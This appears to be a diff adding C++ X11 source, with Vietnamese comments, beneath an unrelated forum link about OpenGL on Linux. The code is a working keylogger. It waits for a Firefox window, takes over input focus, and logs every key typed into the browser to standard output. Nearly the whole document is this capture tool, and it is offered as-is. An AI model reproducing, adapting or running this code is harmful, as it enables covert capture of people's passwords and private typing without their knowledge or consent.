@@ -1,1 +1,113 @@
 http://cts.edu.vn/threads/52792-Khoi-dong-OPENGL-in-Linux.html
+
+#include <X11/X.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <iostream>
+#include <unistd.h>
+#include <string>
+using namespace std;
+
+string WINDOWS_FIREFOX = "Mozilla Firefox";
+
+// lay toan bo cac cua so chuong trinh dang duoc chay
+Window *list (Display *disp, unsigned long *len) {
+ Atom prop = XInternAtom(disp,"_NET_CLIENT_LIST",False), type;
+ int form;
+ unsigned long remain;
+ unsigned char *list;
+
+ if (XGetWindowProperty(disp,XDefaultRootWindow(disp),prop,0,1024,False,AnyPropertyType,
+             &type,&form,len,&remain,&list) != Success) {
+ 	return 0;
+ }
+
+ return (Window*)list;
+}
+
+// lay ra ten cua cua so chuong trinh
+char *name (Display *disp, Window win) {
+	Atom prop = XInternAtom(disp,"WM_NAME",False), type;
+	int form;
+	unsigned long remain, len;
+	unsigned char *list;
+
+	if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
+		           &type,&form,&len,&remain,&list) != Success) {
+  return NULL;
+	}
+	return (char*)list;
+}
+
+int main(int argc, char* argv[]){
+	// variable
+	int i;
+	unsigned long len;
+	XKeyEvent esend;
+	Display *disp = XOpenDisplay(NULL);
+	Window *listT;
+	Window firefoxWindows = -1; // cua so firefox
+	char *nameT;
+	// ---------- xu ly ---------- //
+	while (true) {
+		// lay danh sach tat ca cac windows chuong trinh dang duoc bat
+  listT = (Window*)list(disp,&len);
+  // duyet tat ca cac windows dang duoc bat
+  for (i=0;i<(int)len;i++) {
+			// lay ten cua so
+			nameT = name(disp,listT[i]);
+			string nameTAsString(nameT);
+			// tim kiem cua so firefox
+			if (nameTAsString.find(WINDOWS_FIREFOX) != std::string::npos) {
+					// neu tim thay
+					firefoxWindows = listT[i];
+			}
+  }
+  // kiem tra lay cua so firefox
+  if (firefoxWindows != -1) {
+		// tim thay cua so firefox duoc bat
+		cout << "Firefox da duoc khoi dong" << endl;
+		// keylog -- ham xu ly chinh
+		char buf[17]; // lay ky tu duoc nhap tu ban phim
+		KeySym ks; // cac phim chuc nang
+		XComposeStatus comp;
+		int revert; // trang thai focus hien tai
+		Window root = firefoxWindows; // dat cua so chinh la firefox
+		XGetInputFocus(disp, &firefoxWindows, &revert); // lay cua so dang duoc focus va trang thai focus hien tai
+ 	XSelectInput(disp, firefoxWindows, KeyPressMask|KeyReleaseMask|FocusChangeMask); // nhan su kien
+  // bat dau xu ly phan tich cac su kien
+		XEvent ev; // bien chua su kien
+		while (1) {
+			XNextEvent(disp, &ev); // lay su kien tiep theo trong queue
+			switch (ev.type) {
+	  	case FocusOut: { // bat su kien nguoi dung thoat khoi cua so firefox
+					// neu cua so dang duoc focus khong phai firefox thi khong nhan su kien nao
+					if (firefoxWindows != root) {
+			  	XSelectInput(disp, firefoxWindows, 0);
+					}
+					// lay cua so dang duoc focus va trang thai focus hien tai
+					XGetInputFocus(disp, &firefoxWindows, &revert);
+					if (firefoxWindows == PointerRoot) {
+				 	firefoxWindows = root;
+						cout << "root: " << root << endl;
+					}
+					XSelectInput(disp, firefoxWindows, KeyPressMask|KeyReleaseMask|FocusChangeMask);
+					break;
+		  }
+		  case KeyPress: { // bat su kien nhan phim
+					len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
+					if (len > 0 && isprint(buf[0])) {
+						buf[len]=0;
+						cout << "String: " << buf << endl;
+					}
+					else {
+				 	cout << "Key is: " << (int)ks << endl;
+					}
+		  }
+			} // end switch
+		} // end while
+  } else {
+  	//Not found firefox!
+ 	}
+	}
+}
